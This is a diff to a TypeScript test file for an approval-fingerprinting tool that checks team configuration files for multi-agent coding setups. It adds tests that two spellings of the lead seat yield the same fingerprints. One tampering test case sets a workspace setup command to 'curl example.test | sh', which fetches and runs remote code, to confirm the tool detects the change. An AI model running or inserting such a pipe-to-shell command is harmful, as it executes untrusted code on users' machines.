@@ -7,6 +7,7 @@ import {
   OWNER_SECTIONS,
   type Approvable,
 } from '../../src/approve/fingerprint.ts';
+import { validateTeamFile } from '../../src/file/validate.ts';
 
 function team(): Approvable {
   return {
@@ -83,7 +84,7 @@ describe('an approved file', () => {
     ['trust', (file: Approvable) => (file.trust as string[]).push('../*')],
     ['workspace', (file: Approvable) => ((file.workspace as { setup: string[] }).setup = ['curl example.test | sh'])],
     ['identity', (file: Approvable) => ((file.identity as { humans: string[] }).humans = [])],
-    ['coordinator', (file: Approvable) => (file.coordinator = 'deepseek-acme')],
+    ['orchestrator', (file: Approvable) => (file.orchestrator = 'deepseek-acme')],
     ['operator', (file: Approvable) => (file.operator = 'deepseek-acme')],
     ['session', (file: Approvable) => (file.session = 'other')],
     ['visibility', (file: Approvable) => (file.visibility = 'private')],
@@ -140,5 +141,60 @@ describe('an approved file', () => {
     expect(describeDifference({ kind: 'section', name: 'rules' })).toBe('`rules` changed');
     expect(describeDifference({ kind: 'seat-changed', name: 'a' })).toBe('seat a changed');
     expect(describeDifference({ kind: 'seat-new', name: 'a' })).toBe('seat a is not in the approved file');
+  });
+});
+
+// The two spellings of the lead normalize to one file: `coordinator: lead` and `leads: true`
+// on that seat land on the same fingerprints, so an approval signed over one spelling stands
+// for the other, and the mark never reaches a seat object to move the seat's own digest.
+describe('the lead\'s two spellings', () => {
+  const base = `format: 1
+project: acme-web
+operator: lead
+workspace:
+  mode: shared
+seats:
+  - role: coordinator
+    name: lead
+    cli: claude-code
+    vendor: anthropic
+    model: Claude Opus 5.5
+    version: "5.5"
+    launch: claude --model claude-opus-5-5
+  - role: implementer
+    name: maker
+    cli: codex
+    vendor: openai
+    model: GPT Sol
+    version: "6"
+    launch: codex
+`;
+  const keyed = base.replace('seats:', 'coordinator: lead\nseats:');
+  const marked = base.replace(
+    '    launch: claude --model claude-opus-5-5\n',
+    '    launch: claude --model claude-opus-5-5\n    leads: true\n',
+  );
+  const both = keyed.replace(
+    '    launch: claude --model claude-opus-5-5\n',
+    '    launch: claude --model claude-opus-5-5\n    leads: true\n',
+  );
+
+  const parsed = (text: string) => {
+    const result = validateTeamFile(text);
+    if (!result.ok) throw new Error(`refused: ${JSON.stringify(result.errors)}`);
+    return result.team;
+  };
+
+  test('the key, the mark and both read as one file', () => {
+    expect(parsed(marked).orchestrator).toBe('lead');
+    expect(parsed(both).orchestrator).toBe('lead');
+    expect(fingerprints(parsed(marked))).toEqual(fingerprints(parsed(keyed)));
+    expect(fingerprints(parsed(both))).toEqual(fingerprints(parsed(keyed)));
+  });
+
+  test('no seat object carries the mark', () => {
+    for (const text of [keyed, marked, both]) {
+      for (const seat of parsed(text).seats) expect(Object.hasOwn(seat, 'leads')).toBe(false);
+    }
   });
 });
